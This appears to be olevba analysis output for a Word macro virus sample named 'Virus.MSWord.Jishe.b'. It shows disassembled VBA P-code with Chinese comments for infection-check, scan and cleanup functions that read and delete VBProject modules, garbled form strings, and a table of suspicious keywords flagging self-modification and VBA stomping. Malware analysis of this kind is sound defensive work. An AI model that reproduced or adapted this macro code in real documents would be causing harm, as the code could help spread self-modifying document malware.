' 	IfBlock 
' Line #142:
' 	LitStr 0x000C "使用数据类型"
' 	Ld myType 
' 	Add 
' 	LitStr 0x0038 "调用函数Infected，系统只允许使用Document及Template类型。"
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #143:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #144:
' 	ExitFunc 
' Line #145:
' 	EndIfBlock 
' Line #146:
' Line #147:
' 	QuoteRem 0x0004 0x0016 "检查目标文档是否被保护"
' Line #148:
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #149:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #150:
' 	ExitFunc 
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' 	QuoteRem 0x0004 0x0040 "当ThisDocument,myModule,myUserForm均存在时，表示该文件已经被感染"
' Line #154:
' 	LitDI2 0x0000 
' 	St HasVirus 
' Line #155:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #156:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #157:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #158:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #159:
' 	Ld HasVirus 
' 	LitDI2 0x0001 
' 	Or 
' 	St HasVirus 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Eq 
' 	ElseIfBlock 
' Line #162:
' 	Ld HasVirus 
' 	LitDI2 0x0002 
' 	Or 
' 	St HasVirus 
' Line #163:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Eq 
' 	ElseIfBlock 
' Line #164:
' 	Ld HasVirus 
' 	LitDI2 0x0004 
' 	Or 
' 	St HasVirus 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	NextVar 
' Line #167:
' 	Ld HasVirus 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #168:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #169:
' 	ElseBlock 
' Line #170:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	EndFunc 
' Line #173:
' 	QuoteRem 0x0000 0x0028 "检查指定的打开文档及模板中是否有病毒存在"
' Line #174:
' 	FuncDefn (Private Function ScanDocument(myDocOrTemp) As Integer)
' Line #175:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn i (As Integer)
' 	VarDefn myStr (As String)
' Line #176:
' 	Dim 
' 	VarDefn LinesofCode (As Integer)
' Line #177:
' Line #178:
' 	Ld cOK 
' 	St ScanDocument 
' Line #179:
' 	QuoteRem 0x0004 0x0014 "检查参数类型是否正确"
' Line #180:
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #181:
' 	LitStr 0x0038 "调用函数ScanDocument只能使用Document及Template数据类型。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #182:
' 	ExitFunc 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld myDocOrTemp 
' 	MemLd New 
' 	LitStr 0x000A "检查结果："
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #185:
' 	QuoteRem 0x0004 0x0016 "检查程序模块是否被保护"
' Line #186:
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #187:
' 	Ld cDocProtected 
' 	St ScanDocument 
' Line #188:
' 	Ld myStr 
' 	LitStr 0x0046 "  文件中的程序代码被保护，系统无法自动查杀，但也可能存在病毒，请小心！"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #189:
' 	ExitFunc 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #192:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #193:
' 	QuoteRem 0x000C 0x0030 "此部分有代码时，如果找不到本模块标志则认定为病毒"
' Line #194:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #195:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #196:
' 	Ld ScanDocument 
' 	Ld cDocHasCodeElse 
' 	Or 
' 	St ScanDocument 
' Line #197:
' 	Ld myStr 
' 	LitStr 0x0003 "  <"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0023 ">对象中有其他程序存在，大概是病毒。"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Ne 
' 	Paren 
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #200:
' 	QuoteRem 0x000C 0x0034 "文档中除本模块代码之外，如果还有其它代码则认定为病毒"
' Line #201:
' 	Ld ScanDocument 
' 	Ld cDocHasModuleElse 
' 	Or 
' 	St ScanDocument 
' Line #202:
' 	Ld myStr 
' 	LitStr 0x000D "  有其他模块<"
' 	Add 
' 	Ld xItem 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0017 ">存在，极有可能是病毒。"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	StartForVariable 
' 	Next 
' Line #205:
' 	Ld ScanDocument 
' 	Ld cOK 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld myStr 
' 	LitStr 0x0018 "  没有病毒，请放心使用。"
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St myStr 
' 	EndIf 
' Line #206:
' 	Ld pVirusReport 
' 	Ld myStr 
' 	Add 
' 	St pVirusReport 
' Line #207:
' 	EndFunc 
' Line #208:
' 	QuoteRem 0x0000 0x002A "清除指定的打开文档及模板中的病毒模块及代码"
' Line #209:
' 	FuncDefn (Private Function ClearDocument(myDocOrTemp) As Boolean)
' Line #210:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn LinesofCode (As Integer)
' Line #211:
' Line #212:
' 	LitVarSpecial (False)
' 	St ClearDocument 
' Line #213:
' 	QuoteRem 0x0004 0x0014 "检查参数类型是否正确"
' Line #214:
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myDocOrTemp 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #215:
' 	LitStr 0x0039 "调用函数ClearDocument只能使用Document及Template数据类型。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #216:
' 	ExitFunc 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	IfBlock 
' Line #219:
' 	LitVarSpecial (True)
' 	St ClearDocument 
' Line #220:
' 	ExitFunc 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	QuoteRem 0x0004 0x0012 "检查文档是否有病毒"
' Line #223:
' 	Ld myDocOrTemp 
' 	ArgsLd ScanDocument 0x0001 
' 	IfBlock 
' Line #224:
' 	StartForVariable 
' 	Ld xItem 
' 	EndForVariable 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #225:
' 	Ld xItem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #226:
' 	Ld xItem 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LinesofCode 
' Line #227:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld cMyID 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #228:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xItem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #229:
' 	EndIfBlock 
' Line #230:
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyModule 
' 	Ne 
' 	Ld xItem 
' 	MemLd New 
' 	Ld cMyUserForm 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #231:
' 	Ld xItem 
' 	Ld myDocOrTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	StartForVariable 
' 	Next 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	LitVarSpecial (True)
' 	St ClearDocument 
' Line #236:
' 	EndFunc 
' Macros/VBA/VirusReport - 5578 bytes
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe.b' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

